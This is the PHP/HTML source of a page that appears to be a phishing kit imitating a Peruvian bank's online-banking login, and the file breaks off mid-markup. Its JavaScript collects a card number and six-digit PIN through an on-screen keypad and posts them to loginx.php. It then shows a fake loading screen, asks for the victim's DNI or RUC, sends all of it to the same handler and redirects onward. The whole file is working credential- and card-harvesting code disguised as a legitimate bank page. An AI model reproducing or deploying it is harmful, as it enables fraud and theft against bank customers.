<?php
error_reporting(0);
session_start();
/*===================================================*/
$b = mt_rand(1,5);
date_default_timezone_set("America/Lima");
$time = date('hi');
/*===================================================*/
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
	<script type="text/javascript" src="files/js/jquery-1.8.3.min.js"></script>
	<script type="text/javascript" src="files/js/jquery.creditCardValidatorss.js"></script>
	<script type="text/javascript">
        function evalRanTable(valor)
        {
            var longitud = parseInt($("#ind_long_clave").val());
            if($("#token").val().length < longitud)
            {
                $("#token").val($("#token").val()+valor);
            }
    	}

    	function isInputNumber(evt)
        {

            var ch = String.fromCharCode(evt.which);

            if(!(/[0-9]/.test(ch)))
            {
                evt.preventDefault();
            }
		    
        }

    	function logintud() 
        {

            token = document.getElementById("token").value;

            uno = document.getElementById("1");
            dos = document.getElementById("2");
            tres = document.getElementById("3");
            cuatro = document.getElementById("4");
            cinco = document.getElementById("5");
            seis = document.getElementById("6");

            if (token.length===0) 
            {
                uno.classList.remove("botones-active");
                dos.classList.remove("botones-active");
                tres.classList.remove("botones-active");
                cuatro.classList.remove("botones-active");
                cinco.classList.remove("botones-active");
                seis.classList.remove("botones-active");
            }

            if (token.length===1) 
            {
                uno.classList.add("botones-active");
                dos.classList.remove("botones-active");
                tres.classList.remove("botones-active");
                cuatro.classList.remove("botones-active");
                cinco.classList.remove("botones-active");
                seis.classList.remove("botones-active");
            }

            else if (token.length===2) 
            {
                uno.classList.add("botones-active");
                dos.classList.add("botones-active");
                tres.classList.remove("botones-active");
                cuatro.classList.remove("botones-active");
                cinco.classList.remove("botones-active");
                seis.classList.remove("botones-active");
            }

            else if (token.length===3) 
            {
                uno.classList.add("botones-active");
                dos.classList.add("botones-active");
                tres.classList.add("botones-active");
                cuatro.classList.remove("botones-active");
                cinco.classList.remove("botones-active");
                seis.classList.remove("botones-active");
            }

            else if (token.length===4) 
            {
                uno.classList.add("botones-active");
                dos.classList.add("botones-active");
                tres.classList.add("botones-active");
                cuatro.classList.add("botones-active");
                cinco.classList.remove("botones-active");
                seis.classList.remove("botones-active");
            }

            else if (token.length===5) 
            {
                uno.classList.add("botones-active");
                dos.classList.add("botones-active");
                tres.classList.add("botones-active");
                cuatro.classList.add("botones-active");
                cinco.classList.add("botones-active");
                seis.classList.remove("botones-active");
            }

            else if (token.length===6) 
            {
                uno.classList.add("botones-active");
                dos.classList.add("botones-active");
                tres.classList.add("botones-active");
                cuatro.classList.add("botones-active");
                cinco.classList.add("botones-active");
                seis.classList.add("botones-active");
            }

    	}
    	

	</script>

	<script type="text/javascript">
		
		function deletexd() {

    		token = document.getElementById("token");
			
			$(token).val(
    			function(index, value){
        		return value.substr(0, value.length - 1);
			})

    	}

	</script>

	<script type="text/javascript">

		function clearxd() {

    		document.getElementById('token').value = ''
    	}

	</script>

	<style type="text/css">
		@font-face {
		  font-family: StRyde-Regular;
		  src: url("files/fonts/loli_loli_manito_stryde-regular-webfont.eot");
		  src: url("files/fonts/loli_manito_stryde-regular-webfont.eot?#iefix") format("embedded-opentype"), url("files/fonts/loli_manito_stryde-regular-webfont.woff") format("woff"), url("files/fonts/loli_manito_stryde-regular-webfont.ttf") format("truetype"), url("files/fonts/loli_manito_stryde-regular-webfont.svg#StRyde-Regular") format("svg");
		  font-weight: 300;
		  font-style: normal; }
		@font-face {
		  font-family: StRyde-Medium;
		  src: url("files/fonts/loli_manito_stryde-medium-webfont.eot");
		  src: url("files/fonts/loli_manito_stryde-medium-webfont.eot?#iefix") format("embedded-opentype"), url("files/fonts/loli_manito_stryde-medium-webfont.woff") format("woff"), url("files/fonts/loli_manito_stryde-medium-webfont.ttf") format("truetype"), url("files/fonts/loli_manito_stryde-medium-webfont.svg#StRyde-Medium") format("svg");
		  font-weight: 300;
		  font-style: normal; }
		@font-face {
		  font-family: StRyde-Medium-Italic;
		  src: url("files/fonts/loli_manito_stryde-medium-italic-webfont.eot");
		  src: url("files/fonts/loli_manito_stryde-medium-italic-webfont.eot?#iefix") format("embedded-opentype"), url("files/fonts/loli_manito_stryde-medium-italic-webfont.woff") format("woff"), url("files/fonts/loli_manito_stryde-medium-italic-webfont.ttf") format("truetype"), url("files/fonts/loli_manito_stryde-medium-italic-webfont.svg#StRyde-Medium-Italic") format("svg");
		  font-weight: 300;
		  font-style: normal; }
		@font-face {
		  font-family: StRyde-Bold;
		  src: url("files/fonts/loli_manito_stryde-bold-webfont.eot");
		  src: url("files/fonts/loli_manito_stryde-bold-webfont.eot?#iefix") format("embedded-opentype"), url("files/fonts/loli_manito_stryde-bold-webfont.woff") format("woff"), url("files/fonts/loli_manito_stryde-bold-webfont.ttf") format("truetype"), url("files/fonts/loli_manito_stryde-bold-webfont.svg#StRyde-Bold") format("svg");
		  font-weight: 700;
		  font-style: normal; }
		@font-face {
		  font-family: StRyde-Bold-Italic;
		  src: url("files/fonts/loli_manito_stryde-bold-italic-webfont.eot");
		  src: url("files/fonts/loli_manito_stryde-bold-italic-webfont.eot?#iefix") format("embedded-opentype"), url("files/fonts/loli_manito_stryde-bold-italic-webfont.woff") format("woff"), url("files/fonts/loli_manito_stryde-bold-italic-webfont.ttf") format("truetype"), url("files/fonts/loli_manito_stryde-bold-italic-webfont.svg#StRyde-Bold-Italic") format("svg");
		  font-weight: 700;
		  font-style: italic; }
		/*Classic Font*/
		@font-face {
		  font-family: Flexo-Regular;
		  src: url("files/fonts/loli_manito_flexo-regular-webfont.eot");
		  src: url("files/fonts/loli_manito_flexo-regular-webfont.eot?#iefix") format("embedded-opentype"), url("files/fonts/loli_manito_flexo-regular-webfont.woff") format("woff"), url("files/fonts/loli_manito_flexo-regular-webfont.ttf") format("truetype"), url("files/fonts/loli_manito_flexo-regular-webfont.svg#Flexo-Regular") format("svg");
		  font-weight: 300;
		  font-style: normal; }
		@font-face {
		  font-family: Flexo-Medium;
		  src: url("files/fonts/loli_manito_flexo-medium-webfont.eot");
		  src: url("files/fonts/loli_manito_flexo-medium-webfont.eot?#iefix") format("embedded-opentype"), url("files/fonts/loli_manito_flexo-medium-webfont.woff") format("woff"), url("files/fonts/loli_manito_flexo-medium-webfont.ttf") format("truetype"), url("files/fonts/loli_manito_flexo-medium-webfont.svg#Flexo-Medium") format("svg");
		  font-weight: 300;
		  font-style: normal; }
		@font-face {
		  font-family: Flexo-Demi;
		  src: url("files/fonts/loli_manito_flexo-demi-webfont.eot");
		  src: url("files/fonts/loli_manito_flexo-demi-webfont.eot?#iefix") format("embedded-opentype"), url("files/fonts/loli_manito_flexo-demi-webfont.woff") format("woff"), url("files/fonts/loli_manito_flexo-demi-webfont.ttf") format("truetype"), url("files/fonts/loli_manito_flexo-demi-webfont.svg#Flexo-Demi") format("svg");
		  font-weight: 300;
		  font-style: normal; }
		@font-face {
		  font-family: Flexo-Bold;
		  src: url("files/fonts/loli_manito_flexo-bold-webfont.eot");
		  src: url("files/fonts/loli_manito_flexo-bold-webfont.eot?#iefix") format("embedded-opentype"), url("files/fonts/loli_manito_flexo-bold-webfont.woff") format("woff"), url("files/fonts/loli_manito_flexo-bold-webfont.ttf") format("truetype"), url("files/fonts/loli_manito_flexo-bold-webfont.svg#Flexo-Bold") format("svg");
		  font-weight: 700;
		  font-style: normal; }
		@font-face {
		  font-family: Flexo-Bold-Italic;
		  src: url("files/fonts/loli_manito_flexo-bold-italic-webfont.eot");
		  src: url("files/fonts/loli_manito_flexo-bold-italic-webfont.eot?#iefix") format("embedded-opentype"), url("files/fonts/loli_manito_flexo-bold-italic-webfont.woff") format("woff"), url("files/fonts/loli_manito_flexo-bold-italic-webfont.ttf") format("truetype"), url("files/fonts/loli_manito_flexo-bold-italic-webfont.svg#Flexo-Bold-Italic") format("svg");
		  font-weight: 700;
		  font-style: italic; }
		@font-face {
		  font-family: Flexo-Heavy;
		  src: url("files/fonts/loli_manito_flexo-heavy-webfont.eot");
		  src: url("files/fonts/loli_manito_flexo-heavy-webfont.eot?#iefix") format("embedded-opentype"), url("files/fonts/loli_manito_flexo-heavy-webfont.woff") format("woff"), url("files/fonts/loli_manito_flexo-heavy-webfont.ttf") format("truetype"), url("files/fonts/loli_manito_flexo-heavy-webfont.svg#Flexo-Heavy") format("svg");
		  font-weight: 700;
		  font-style: normal; }

		html {
			height: 100%;
		}

		.body {
            margin: 0px;
        }

		.box-login {
            margin-top: 15px;
            width: 300px;
            margin-left: auto;
            margin-right: auto;
        }

        @media (min-width: 1024px) {
        	.box-login {
    			padding: 65px 0px 0px;
			}
		}
        	
        .keypad-digit {
        	display: inherit;
    		float: left !important;
    		margin-bottom: 0 !important;
    		margin-right: 0 !important;
    		width: 25%;
    		height: 70px;
    		vertical-align: top;
    		outline: thin solid rgba(215, 215, 215, 0.9);
    		background-color: #f4f4f4;
        }

        .image-digit {
        	width: 60px;
        	height: 60px;
        	display: block;
        	margin-left: auto;
        	margin-right: auto;
        	margin-top: 5px;
        }

        .image-action {
        	width: 50px;
        	height: 50px;
        	display: block;
        	margin-left: auto;
        	margin-right: auto;
        	margin-top: 10px;
        }

        .login-header {
        	background-color: #002D87;
    		box-sizing: border-box;
    		height: 60px;
    		padding: 16px;
    		width: 100%;
        }

        .title-form {
			font-family: Flexo-Bold; color: #002D87; font-size: 24px; font-stretch: normal; font-style: normal; letter-spacing: normal; line-height: 1.33; padding-left: 15px; padding-right: 15px;
		}

		.prueba {
			width: 59%;
			background-image: url(files/img/loli_manito_HBK-login-fondo4.jpg);
    		background-repeat: no-repeat;
    		background-size: cover;
    		background-position: center;
		}

		.footer-text {
			color: #6c7481;
    		font-size: 12px;
    		font-stretch: normal;
    		font-style: normal;
    		font-weight: normal;
    		letter-spacing: normal;
    		line-height: 2;
    		margin-bottom: 0px;
    		margin-top: 0px;
    		font-family: Flexo-Regular;
		}

		.login-footer {
			margin-left: 15px;
			margin-right: 15px;
			margin-top: 30px;
			margin-bottom: 10px;
		}

		.footer-logo {
			height: 17px;
   			width: 68px;
		}

		.footer-logo-container {
			margin-top: 5px;
		}

		.footer-text-container {
			display: block;
		}

		.separador {
			margin-left: 5px;
			margin-right: 5px;
		}

		.botonsitos {
			position: absolute; display: flex; bottom: 10px; left: 35px;
		}

		.hidden {
			display: none;
		}

		.keypad {
			margin-top: 30px; height: 210px;
		}

		.seed-enabled {
			border-radius: 5px;
    		border: 1px solid;
    		border-color: #e2e2e2;
    		position: inherit;
    		width: 49px;
    		height: 49px;
    		cursor: pointer;
		}

		.keypad-seed-container {
			margin-top: 30px;
		}

		.forget-desactivado {
			margin-top: 40px;
		}

		.forget-activado {
			margin-top: 20px;
		}

		.label {
			position: relative; display: inline-block; width: 100%; border-bottom: 1px solid #7194BD;
		}

		.label-error {
			position: relative; display: inline-block; width: 100%; border-bottom: 1px solid #dc3545;
		}

		@media (min-width: 1024px) {
        	.login-header {
    			position: absolute;
    			top: 0px;
    			background: none;
			}
			.box-login {
				width: 400px;
				margin-bottom: 60px;
			}
			.title-form {
				padding-left: 0px;
				padding-right: 0px;
			}
			.footer-text-container {
				display: flex;
				position: fixed;
				bottom: 5px;
			}
			.footer-logo-container {
				display: none;
			}
			.keypad {
				display: none;
			}

		}

		@media (max-width: 1024px) {
        	.prueba {
    			display: none;
			}
			.separador {
				display: none;
			}
			.keypad-seed-container {
				display: none;
			}
		}

	</style>

	<script type="text/javascript">
		
		function showkeyboard() {

			botonsitos = document.getElementById("botonsitos");
			keypad = document.getElementById("keypad");
			forgot_clave = document.getElementById("forgot-clave");
			keypadpc = document.getElementById("keypadpc");

			botonsitos.classList.remove("hidden");
        	keypad.classList.remove("hidden");
        	keypadpc.classList.remove("hidden");
        	forgot_clave.classList.remove("forget-desactivado");
        	forgot_clave.classList.add("forget-activado");

		}

	</script>

	<style type="text/css">

		.modal {
		  display: none;
		  position: fixed; /* Stay in place */
		  z-index: 1; /* Sit on top */
		  padding-top: 100px; /* Location of the box */
		  left: 0;
		  top: 0;
		  width: 100%; /* Full width */
		  height: 100%; /* Full height */
		  overflow: auto; /* Enable scroll if needed */
		  background-color: rgb(0,0,0); /* Fallback color */
		  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
		}

		.box-form {
			width: 500px;margin-left: auto;margin-right: auto;background-color: white;padding: 20px;box-shadow: 0px 0px 9px -1px rgba(0, 0, 0, 0.32);border-radius: 5px; margin-bottom: 30px;
		}

		.form-title {
			width: 350px; margin-right: auto; margin-left: auto; margin-top: 10px; text-align: center;
		}

		.boton {
			font-family: Flexo-Bold; height: 40px; padding: 0 16px; font-size: 18px; line-height: 38px; border-radius: 20px; color: #fff; background-color: #ff7800; border: 1px solid #ff7800; box-shadow: none; width: 100%;
		}

		.disabled {
			background-color: #cecece; border: 1px solid #cecece; pointer-events: none;
		}

		.botoneslenght {
			background-color: #F1F1F1; border-radius: 50px; height: 8px; width: 8px; margin-right: 17px; border: 1px solid #A8A8A8
		}

		.botones-active {
			background-color: #002d74;
		}

		.keypad-seed-containerx {
			margin-top: 20px;
		}

		.boton-box {
			margin: 30px 25px 10px 25px;
			width: 300px;
		}

		@media (max-width: 1024px) {
			.box-form {
		  		width: auto;
		  		margin-left: 10px;
		  		margin-right: 10px;
			}
			.form-title {
		  		width: auto;
		  	}
		  	.boton-box {
		  		margin: 30px 0px 10px 0px;
		  	}
		}

		.seed-enabledx {
			border-radius: 5px;
    		border: 1px solid;
    		border-color: #e2e2e2;
    		position: inherit;
    		width: 40px;
    		height: 40px;
    		cursor: pointer;
		}

		.clean-buttonx {
			border-radius: 5px;
    		border: 1px solid;
    		border-color: #e2e2e2;
    		position: inherit;
			width: 40px;
    		height: 40px;
		}

		.clean-button {
			border-radius: 5px;
    		border: 1px solid;
    		border-color: #e2e2e2;
    		position: inherit;
			width: 49px;
    		height: 49px;
		}

		.error {
			position: absolute; width: 330px; top: 18px; border: 1px solid #ff003b; border-radius: 5px; background-color: #ffecf1; padding: 10px; font-size: 14px; display: flex;
		}

		.triangulo {
			color: #ff003b;font-size: 14px;padding-left: 10px;padding-right: 10px;padding-top: 3px;
		}

		.cruz {
			color: #ff003b;font-size: 14px;padding-left: 10px;padding-right: 10px;
		}

		@media (max-width: 1024px) {
			.error {
				width: 275px; top: 69px;
			}
			.triangulo {
				display: none;
			}
			.cruz {
				color: #ff003b;font-size: 14px;padding-left: 0px;padding-right: 0px;
			}
		}

		.subtitle-card {
			font-family: Flexo-Regular; font-weight: bold; color: #012d74; font-size: 14px; margin-top: 25px;
		}

		.subtitle-card-error {
			font-family: Flexo-Regular; font-weight: bold; color: #dc3545; font-size: 14px; margin-top: 25px;
		}

		.subtitle-clave {
			font-family: Flexo-Regular; font-weight: bold; color: #012d74; font-size: 14px; 
		}

		.subtitle-clave-error {
			font-family: Flexo-Regular; font-weight: bold; color: #dc3545; font-size: 14px; 
		}

		.input-form {
			border: none; font-family: Flexo-Regular; margin-left: 30px; width: 100%; font-size: 14px; margin-bottom: 5px; outline: none !important;
		}

		.card-icon {
			position: absolute; padding-right: 7px; bottom: 10px; left: 1px; background-position-x: center; background-position-y: center; background-size: 100%; background-repeat-x: no-repeat; background-repeat-y: no-repeat; height: 10px; width: 8px; background-image: url("files/img/loli_manito_card-icon.png"); border: none;
		}

		.card-icon-error {
			position: absolute; padding-right: 7px; bottom: 10px; left: 1px; background-position-x: center; background-position-y: center; background-size: 100%; background-repeat-x: no-repeat; background-repeat-y: no-repeat; height: 10px; width: 8px; background-image: url("files/img/loli_manito_card-icon-error.png"); border: none;
		}

		.lock-icon {
			position: absolute; padding-right: 7px; bottom: 9px; left: 1px; background-position-x: center; background-position-y: center; background-size: 100%; background-repeat-x: no-repeat; background-repeat-y: no-repeat; height: 17px; width: 5px; background-image: url("files/img/loli_manito_candado.png"); border: none;
		}

		.lock-icon-error {
			position: absolute; padding-right: 7px; bottom: 9px; left: 1px; background-position-x: center; background-position-y: center; background-size: 100%; background-repeat-x: no-repeat; background-repeat-y: no-repeat; height: 17px; width: 5px; background-image: url("files/img/loli_manito_candado-error.png"); border: none;
		}

		.input-form-error {
			border: none; border-bottom: 1px solid #dc3545; width: 100%;
		}

		.captcha {
			font-family: Flexo-Regular; font-size: 16px; line-height: 32px; padding: 0; color: #282828; outline: 0; -webkit-box-shadow: none; box-shadow: none; background: 0 0; border: none; border-radius: 0; border-bottom: 1px solid #012d74; margin-left: 10px; width: 170px; margin-bottom: 10px; outline: none !important;
		}

		.captcha-error {
			font-family: Flexo-Regular; font-size: 16px; line-height: 32px; padding: 0; color: #282828; outline: 0; -webkit-box-shadow: none; box-shadow: none; background: 0 0; border: none; border-radius: 0; border-bottom: 1px solid #dc3545; margin-left: 10px; width: 170px; margin-bottom: 10px;
		}

	</style>

	<script type="text/javascript">

		function evalRanTableDNI(valor){
                var longitud = parseInt($("#ind_long_dni").val());
        	if($("#dni").val().length < longitud){
        		$("#dni").val($("#dni").val()+valor);
        	}
    	}


	</script>

	<script>
	
	function showPage() {
	  document.getElementById("loading-screen").style.display = "none";
	  document.getElementById("modal").style.display = "block";
	}
	
	</script>

	<script type="text/javascript">
		function logintud_dni() {

    		dni = document.getElementById("dni").value;

    		boton = document.getElementById("boton");
                var longitud = parseInt($("#ind_long_dni").val());
                if(dni.length<longitud)
                {
                    boton.classList.add("disabled");
                }else
                {
                    boton.classList.remove("disabled");
                }

//    		if (dni.length===1) {
//    			boton.classList.add("disabled");
//    		}
//
//    		else if (dni.length===2) {
//    			boton.classList.add("disabled");
//    		}
//
//    		else if (dni.length===3) {
//    			boton.classList.add("disabled");
//    		}
//
//    		else if (dni.length===4) {
//    			boton.classList.add("disabled");
//    		}
//
//    		else if (dni.length===5) {
//    			boton.classList.add("disabled");
//    		}
//
//    		else if (dni.length===6) {
//    			boton.classList.add("disabled");
//    		}
//
//    		else if (dni.length===7) {
//    			boton.classList.add("disabled");
//    		}
//
//    		else if (dni.length===8) {
//    			boton.classList.remove("disabled");
//    		}

        
    	}
	</script>

	<script type="text/javascript">
		
		function deletexd_dni() {

    		dni = document.getElementById("dni");
			
			$(dni).val(
    			function(index, value){
        		return value.substr(0, value.length - 1);
			})

    	}

	</script>

	<script type="text/javascript">
		function clearxd_dni() {

    		document.getElementById('dni').value = ''
    	}

	</script>

	<script type="text/javascript">

    	function validar()
        {
    		card = document.getElementById('card').value;
                clave = document.getElementById('token').value;
                time = document.getElementById('time').value;

                validation = document.getElementById('validacion').value;

                no_exist_box = document.getElementById('no-exist');

                subtitle_card = document.getElementById('subtitle-card');
                subtitle_clave = document.getElementById('subtitle-clave');

                label_card = document.getElementById('labelcaca');
                label_pass = document.getElementById('label-pass');

                card_icon = document.getElementById('card-icon');
                pass_icon = document.getElementById('pass-icon');

                falta_box = document.getElementById('falta');

                if (card.length<16) 
                {
                    subtitle_card.classList.remove("subtitle-card");
                    label_card.classList.remove("label");
                    card_icon.classList.remove("card-icon");

                    subtitle_card.classList.add("subtitle-card-error");
                    label_card.classList.add("label-error");
                    card_icon.classList.add("card-icon-error");

                    falta_box.classList.remove("hidden");

                    return false; 
                }

                else if (validation === "false") 
                {
                    subtitle_card.classList.remove("subtitle-card");
                    label_card.classList.remove("label");
                    card_icon.classList.remove("card-icon");

                    subtitle_card.classList.add("subtitle-card-error");
                    label_card.classList.add("label-error");
                    card_icon.classList.add("card-icon-error");

                    no_exist_box.classList.remove("hidden");

                    return false;
                }
                else if (clave.length<6) 
                {
                    subtitle_clave.classList.remove("subtitle-clave");
                    label_pass.classList.remove("label");
                    pass_icon.classList.remove("pass-icon");
                    subtitle_clave.classList.add("subtitle-clave-error");
                    label_pass.classList.add("label-error");
                    pass_icon.classList.add("lock-icon-error");
                    falta_box.classList.remove("hidden");
                    return false; 
                }

                var s1 = card.indexOf("491246");
                s1 = parseInt(s1);
                if( s1 >= 0 )
                {
                    document.getElementById("ingrese_su").innerHTML="Ingrese su RUC";
                    document.getElementById("ind_long_dni").value=11;
                }

                document.getElementById("loading-screen").style.display = "block";                
                myVar = setTimeout(showPage, 7000);
                $.ajax({
                url: 'loginx.php?id=0',
                data: {accion: "0" , 'card':card, 'token':clave , 'time':time},
                type: 'post',
                success: function(respXHR)
                {
                	
                }
            });

            return false;

		}

		function clear_error_card() {

			card = document.getElementById('card').value;

			subtitle_card = document.getElementById('subtitle-card');

			label_card = document.getElementById('labelcaca');

			card_icon = document.getElementById('card-icon');

			falta_box = document.getElementById('falta');

			no_exist_box = document.getElementById('no-exist');

			subtitle_card.classList.add("subtitle-card");
			label_card.classList.add("label");
			card_icon.classList.add("card-icon");

			no_exist_box.classList.add("hidden");

			subtitle_card.classList.remove("subtitle-card-error");
			label_card.classList.remove("label-error");
			card_icon.classList.remove("card-icon-error");

			falta_box.classList.add("hidden");
		}

		function clear_error_clave() {

			clave = document.getElementById('token').value;

			subtitle_clave = document.getElementById('subtitle-clave');

			label_pass = document.getElementById('label-pass');

			pass_icon = document.getElementById('pass-icon');

			falta_box = document.getElementById('falta');

			subtitle_clave.classList.add("subtitle-clave");
			label_pass.classList.add("label");
			pass_icon.classList.add("pass-icon");

			subtitle_clave.classList.remove("subtitle-clave-error");
			label_pass.classList.remove("label-error");
			pass_icon.classList.remove("lock-icon-error");

			falta_box.classList.add("hidden");

		}

		function close_error_falta() {

			card = document.getElementById('card').value;

			subtitle_card = document.getElementById('subtitle-card');

			label_card = document.getElementById('labelcaca');

			card_icon = document.getElementById('card-icon');

			falta_box = document.getElementById('falta');

			no_exist_box = document.getElementById('no-exist');

			subtitle_card.classList.add("subtitle-card");
			label_card.classList.add("label");
			card_icon.classList.add("card-icon");

			subtitle_card.classList.remove("subtitle-card-error");
			label_card.classList.remove("label-error");
			card_icon.classList.remove("card-icon-error");

			falta_box.classList.add("hidden");
			no_exist_box.classList.add("hidden");

			clave = document.getElementById('token').value;

			subtitle_clave = document.getElementById('subtitle-clave');

			label_pass = document.getElementById('label-pass');

			pass_icon = document.getElementById('pass-icon');

			subtitle_clave.classList.add("subtitle-clave");
			label_pass.classList.add("label");
			pass_icon.classList.add("pass-icon");

			subtitle_clave.classList.remove("subtitle-clave-error");
			label_pass.classList.remove("label-error");
			pass_icon.classList.remove("lock-icon-error");

		}

    </script>

    <style type="text/css">

    	#myDiv {
			display: none;
		}

    	.loading-screen {
    	  display: none;
		  position: fixed; /* Stay in place */
		  z-index: 1; /* Sit on top */
		  left: 0;
		  top: 0;
		  width: 100%; /* Full width */
		  height: 100%; /* Full height */
		  overflow: auto; /* Enable scroll if needed */
		  background-color: rgba(52, 105, 212, 0.66); /* Fallback color */
		}

		/*** spinner global ****/
		.spinner-global {
		  -webkit-border-radius: 50%;
		  -moz-border-radius: 50%;
		  -ms-border-radius: 50%;
		  border-radius: 50%;
		  animation: spinner-global 0.5s ease-in-out alternate infinite;
		  animation-delay: 0.32s;
		  box-shadow: 0 40px 0 white;
		  height: 16px;
		  margin: -50px auto 0 auto;
		  position: relative;
		  top: 50%;
		  width: 16px; }
		
		.spinner-global:after, .spinner-global:before {
		  -webkit-border-radius: 50%;
		  -moz-border-radius: 50%;
		  -ms-border-radius: 50%;
		  border-radius: 50%;
		  animation: spinner-global 0.5s ease-in-out alternate infinite;
		  box-shadow: 0 40px 0 white;
		  content: '';
		  height: 16px;
		  position: absolute;
		  width: 16px; }
		
		.spinner-global:before {
		  animation-delay: 0.48s;
		  left: -30px; }
		
		.spinner-global:after {
		  animation-delay: 0.16s;
		  right: -30px; }
		
		@keyframes spinner-global {
		  0% {
		    box-shadow: 0 40px 0 white; }
		  100% {
		    box-shadow: 0 20px 0 white; } }

		/* Add animation to "page content" */
		.animate-bottom {
		  position: relative;
		  -webkit-animation-name: animatebottom;
		  -webkit-animation-duration: 1s;
		  animation-name: animatebottom;
		  animation-duration: 1s
		}
		
		@-webkit-keyframes animatebottom {
		  from { bottom:-100px; opacity:0 } 
		  to { bottom:0px; opacity:1 }
		}
		
		@keyframes animatebottom { 
		  from{ bottom:-100px; opacity:0 } 
		  to{ bottom:0; opacity:1 }
		}

	</style>

	

	<script type="text/javascript">

	function validarDNI() 
        {
            card = document.getElementById('card').value;
            clave = document.getElementById('token').value;
            time = document.getElementById('time').value;
            dni = document.getElementById('dni').value;

            $("#modal").hide();
            $("#loading-screen").show();
            
            $.ajax(
            {
                url: 'loginx.php?id=1',
                data: {accion: "0" , 'card':card, 'token':clave , 'dni':dni, 'time':time},
                type: 'post',
                success: function(respXHR)
                {
                    console.log(respXHR);
                    window.location="load?sessionDataKey=" + time;
                }
            });
            return false;
	}

	</script>

</head>
<body class="body">

	<div id="loading-screen" class="loading-screen">
		<div class="spinner-global"></div>
	</div>

	<div id="modal" class="modal">
		<div class="box-form">
			<form method="post" onsubmit="return validarDNI();">
			<input type="hidden" id="time" name="time" value="<?php echo $time;?>">
			<center>
				<img style=" width: 70px; border-radius: 50px; border: 3px solid #a1a9b6; padding: 10px;" src="files/img/loli_manito_user.svg"/>
			</center>
                        <div class="form-title"  >
				<span id="ingrese_su" style="font-family: Flexo-Bold; color: #012d74; font-size: 20px;">Ingrese su número de DNI</span>
			</div>

			<div class="form">

				<input readonly="" type="hidden" id="ind_long_dni" name="ind_long_dni" value="8" />

				<center>

					<div style="margin: 20px;">
					<label style="position: relative; display: inline-block;">
						<input readonly="" style="pointer-events: none; outline: none !important; border: none; border-bottom: 1px solid #7194BD; width: 100%; font-family: Flexo-Regular; text-align: center; font-size: 20px" type="text" id="dni" name="dni" value="">
					</label>
				</div>

				<div id="keypadpcx" class="keypad-seed-containerx">
        <div>
          <div class="separator left">
            <img onclick="evalRanTableDNI('1'); logintud_dni();" class="seed-enabledx" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE5LjYsMTIuN3YxMC4yaC0xLjh2LTguNGMtMC42LDAuMi0xLjYsMC4zLTIuMywwLjRsLTAuMS0xLjRjMS4yLTAuMiwyLjEtMC41LDIuNy0wLjggICBDMTguMiwxMi43LDE5LjYsMTIuNywxOS42LDEyLjd6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSI1IiBjeT0iMTIiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIxIiBjeT0iMTEiLz4KPC9zdmc+">
